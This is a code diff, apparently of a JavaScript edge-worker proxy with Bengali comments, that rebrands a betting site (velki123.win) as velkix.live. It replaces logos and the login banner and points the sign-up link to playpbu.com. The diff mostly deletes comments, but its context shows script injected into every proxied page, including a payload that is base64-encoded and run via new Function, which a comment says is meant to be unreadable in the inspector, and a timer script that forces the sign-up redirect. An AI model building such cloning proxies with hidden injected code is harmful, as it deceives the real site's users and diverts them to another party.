@@ -23,7 +23,6 @@ export default {
         }
 
         // 🔹 আপনার নির্দেশ অনুযায়ী শক্তিশালী IIFE Obfuscation 🔹
-        // এই rawJs আপনার মূল কাজ করবে, কিন্তু ব্রাউজারে এটি এনক্রিপ্ট হয়ে যাবে
         const rawJs = `
           (function() {
             const proxyPrefix = '/__api_proxy/';
@@ -57,8 +56,6 @@ export default {
           })();
         `;
         
-        // আসল কোডটিকে Base64 এ রূপান্তর করে একটি IIFE ফাংশনের ভেতর র‍্যাপ করা হলো 
-        // এর ফলে ইন্সপেক্টরে কোড সম্পূর্ণ আনরিডেবল (Unreadable) দেখাবে
         const obfuscatedPayload = btoa(unescape(encodeURIComponent(rawJs)));
         const secretCode = `!function(){var e="${obfuscatedPayload}",t=decodeURIComponent(escape(atob(e)));new Function(t)()}();`;
 
@@ -154,32 +151,29 @@ export default {
         text = text.replaceAll(/velki123\.win/gi, "velkix.live");
         text = text.replaceAll(/velki123/gi, "velkix.live");
 
-        // 🔹 আপনার নির্দেশ অনুযায়ী লোগো পারফেক্টলি হাইড ও রিপ্লেসমেন্ট 🔹
+        // 🔹 লোগো হাইড ও রিপ্লেসমেন্ট 🔹
         const newLogoUrl = "https://i.postimg.cc/J0P019Hr/20260408-225146.webp";
-        // সোর্স কোড থেকে আগের লোগোর পাথগুলো সম্পূর্ণ মুছে ফেলা হচ্ছে
         text = text.replaceAll("../../assets/images/velki-logo.png", newLogoUrl);
         text = text.replaceAll("/assets/images/velki-logo.png", newLogoUrl);
         text = text.replaceAll("assets/images/velki-logo.png", newLogoUrl);
 
-        // 🔹 আপনার নির্দেশ অনুযায়ী লগিন ব্যানার পারফেক্টলি হাইড ও রিপ্লেসমেন্ট 🔹
+        // 🔹 লগিন ব্যানার পারফেক্টলি রিপ্লেসমেন্ট (ডুপ্লিকেট বাগ ফিক্সড) 🔹
         const newLoginBanner = "https://i.postimg.cc/CLCXKkN6/20260408-232743.webp";
         text = text.replaceAll("../../assets/images/velki-login-signup-banner.png", newLoginBanner);
         text = text.replaceAll("../assets/images/velki-login-signup-banner.png", newLoginBanner);
         text = text.replaceAll("/assets/images/velki-login-signup-banner.png", newLoginBanner);
         text = text.replaceAll("assets/images/velki-login-signup-banner.png", newLoginBanner);
 
-        // 🔹 আপনার নির্দেশ অনুযায়ী Sign Up লিংক পরিবর্তন 🔹
+        // 🔹 Sign Up লিংক পরিবর্তন 🔹
         text = text.replaceAll('class="signup" href="/"', 'class="signup" href="https://playpbu.com"');
 
-        // 🔒 প্রফেশনাল ইনজেকশন (Logo CSS Force + Security JS)
         if (contentType.includes("text/html")) {
-            // 🔹 এখানে width: 115px দেওয়া হয়েছে লোগো বড় দেখানোর জন্য এবং লগিন ব্যানারের CSS এড করা হয়েছে 🔹
+            // 🔹 শুধুমাত্র লোগো বড় করার CSS রাখা হয়েছে, লগিন ব্যানারের CSS রিমুভ করা হয়েছে বাগ ফিক্সের জন্য 🔹
             const forceCSS = `<style>
                 .logo-sec img { content: url("${newLogoUrl}") !important; width: 115px !important; height: auto !important; max-width: none !important; }
-                .login-log-sec img { content: url("${newLoginBanner}") !important; width: 100% !important; height: auto !important; }
             </style>`;
             
-            // 🔹 সাইন আপ লিংকে ক্লিক করলে যেন কোনোভাবেই মিসটেক না হয় তার জন্য ফোর্স জাভাস্ক্রিপ্ট 🔹
+            // 🔹 সাইন আপ লিংকের ফোর্স জাভাস্ক্রিপ্ট 🔹
             const forceJs = `<script>
                 setInterval(() => {
                     document.querySelectorAll('.signup').forEach(btn => {
